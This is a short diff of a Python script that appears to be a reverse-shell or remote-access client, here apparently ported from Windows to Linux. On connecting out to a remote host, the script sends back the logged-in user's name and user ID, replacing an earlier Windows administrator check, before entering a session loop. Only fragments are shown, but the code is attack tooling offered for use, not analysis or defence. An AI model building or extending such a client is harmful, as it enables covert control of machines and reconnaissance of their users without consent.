@@ -2,7 +2,7 @@ import socket
 import subprocess
 import os
 import sys
-import ctypes
+import pwd
 
 def inbound():
     '''handles inbound traffic'''
@@ -25,8 +25,8 @@ def session_handler():
     '''Handles sessions'''
     print(f"[+] Connecting to {host_ip}")
     sock.connect((host_ip, host_port))
-    outbound(os.getlogin())
-    outbound(ctypes.windll.shell32.IsUserAnAdmin())
+    outbound(pwd.getpwuid(os.getuid())[0])
+    outbound(os.getuid())
     print(f"[+] Connected to host {host_ip}")
     while True:
         try:
